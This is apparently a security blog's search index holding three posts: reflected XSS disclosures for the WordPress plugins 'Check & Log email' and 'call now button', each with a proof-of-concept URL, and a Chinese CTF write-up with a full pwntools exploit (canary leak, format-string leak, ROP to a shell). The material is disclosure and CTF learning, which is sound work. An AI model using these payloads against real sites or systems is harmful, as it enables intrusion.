<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>wp_check_email</title>
    <link href="/2022/04/22/wp-check-email/"/>
    <url>/2022/04/22/wp-check-email/</url>
    
    <content type="html"><![CDATA[<h1 id="Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS"><a href="#Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS" class="headerlink" title="Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS"></a>Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS</h1><p>In file <code>check-email\include\Core\UI\Page\Check_Email_Settings_Page.php</code> <code>$_GET[&#39;tab&#39;]</code>does not sanitized and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-check-email/1.png"></p><p>POC:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=check-email-settings&amp;tab=<span class="hljs-string">&quot;&gt; &lt;input type=&quot;</span>text<span class="hljs-string">&quot; name=&quot;</span>test<span class="hljs-string">&quot; value=&quot;</span>xxxxx<span class="hljs-string">&quot; onmouseover=alert(1) test=&quot;</span><span class="hljs-string">&quot;/</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-check-email/2.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>wp_call_now_button</title>
    <link href="/2022/04/22/wp-call-now-button/"/>
    <url>/2022/04/22/wp-call-now-button/</url>
    
    <content type="html"><![CDATA[<h1 id="call-now-button-lt-x3D-1-1-1-Reflected-XSS"><a href="#call-now-button-lt-x3D-1-1-1-Reflected-XSS" class="headerlink" title="call now button &lt;&#x3D; 1.1.1 Reflected XSS"></a>call now button &lt;&#x3D; 1.1.1 Reflected XSS</h1><p>In file <code>/call-now-button/src/admin/action/CnbActionViewEdit.php</code> <code>$_REQUEST[&quot;bid&quot;]</code>does not sanitized properly and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-call-now-button/1.png"></p><p>And <code>$button-&gt;type = &#39;SINGLE&#39; </code>defaultly.</p><p><img src="/2022/04/22/wp-call-now-button/2.png"></p><p>If we want to trigger this xss, we need activate premium first, it’s for free.</p><p><img src="/2022/04/22/wp-call-now-button/3.png"> </p><p>POC:</p><p>According to <a href="https://portswigger.net/research/xss-in-hidden-input-fields">this article</a>, To trigger this xss we need press Shift + Alt + X in windows or Ctrl + Alt + X In macos.</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=call-now-button&amp;bid=xxxxx<span class="hljs-string">&quot; accesskey=X onclick=alert(1) test=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-call-now-button/4.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022虎符babygame</title>
    <link href="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/"/>
    <url>/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/</url>
    
    <content type="html"><![CDATA[<p>比赛中没写出来，照着别人的wp复现了一下，记录下一些知识点。</p><p>题目还算是常规的那种，可以很明显看到漏洞是栈溢出和格式化字符串漏洞。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-04_224726.png"></p><p>首先是栈溢出为猜数游戏设置种子，并且泄露出canary的值。<br>然后通过猜数游戏（CDLL库可自行百度），进入13E7函数，</p><p>格式化字符串泄露出libcbase和elfbase，并且将ret addr改为sub_13E7函数，重新进入sub_13E7函数。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_173926.png"></p><p>此时将ret addr改为main函数，再用利用main函数中的栈溢出漏洞写入rop链，最后拿到shell。</p><p>rop链要加ret的原因是栈未对齐<br><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_174749.png"></p><p>可以看到，红框的语句的作用是检查rsp+0x50是否是0x10的倍数，显然不是，因此要加ret。</p><p>EXP：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> ctypes import cdll, CDLL<br><br><br><span class="hljs-attribute">context</span>.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-attribute">p</span> = process(&#x27;./babygame&#x27;)<br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><br><span class="hljs-attribute">base</span> = p.libs()[<span class="hljs-string">&quot;/hufu/babygame/37ae6078e4e24dcc8196e39efbe8c0bc/37ae6078e4e24dcc8196e39efbe8c0bc/babygame&quot;</span>]<br><br><span class="hljs-attribute">cmd</span> = <span class="hljs-string">&quot;b *%d\n&quot;</span> %(base+<span class="hljs-number">0</span>x1449)<br><span class="hljs-attribute">gdb</span>.attach(p, cmd)<br><br><br><span class="hljs-attribute">name</span> = b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x100+p64(<span class="hljs-number">0</span>x6161616161616161)+b<span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, name)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">9</span>)<br><br><span class="hljs-attribute">canary</span> = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br><br><span class="hljs-attribute">rbp</span> = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment">#print(hex(canary))</span><br><br><span class="hljs-comment">#success(hex(canary))</span><br><span class="hljs-comment">#success(hex(rbp))</span><br><br><span class="hljs-attribute">libc</span> = CDLL(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><span class="hljs-attribute">libc</span>.srand(<span class="hljs-number">0</span>x6161616161616161)<br><br><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">100</span>):<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot; \n&quot;</span>, str((libc.rand()+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>))<br><br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;%62c%9$hhn&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;q%79$p&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;ff%83$pl&quot;</span><br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;q&quot;</span>)<br><span class="hljs-attribute">leak</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br><span class="hljs-attribute">libc_base</span>= leak - <span class="hljs-number">0</span>x240b3<br><span class="hljs-comment">#success(hex(leak))</span><br><span class="hljs-comment">#success(hex(libc_base))</span><br><br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;ff&quot;</span>)<br><span class="hljs-attribute">elf_base</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x1465<br><span class="hljs-comment">#success(hex(elf_base))</span><br><br><span class="hljs-attribute">target</span> = (elf_base+<span class="hljs-number">0</span>x148e)&amp;<span class="hljs-number">0</span>xffff<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;%&#123;&#125;c%9$hn&quot;</span>.format(target).encode()<br><span class="hljs-attribute">payload</span> = payload.ljust(<span class="hljs-number">0</span>x10, b&#x27;a&#x27;)<br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">payload2</span> = b&#x27;q&#x27;*<span class="hljs-number">0</span>x108+p64(canary)+b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x18<br><br><span class="hljs-attribute">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000023b72<br><span class="hljs-attribute">bin_sh</span> = libc_base + <span class="hljs-number">0</span>x1b45bd<br><span class="hljs-attribute">system_addr</span> = libc_base + <span class="hljs-number">0</span>x522c0<br><span class="hljs-attribute">ret</span> = elf_base + <span class="hljs-number">0</span>x1565<br><br><span class="hljs-attribute">payload2</span> += p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system_addr)<br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, payload2)<br><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
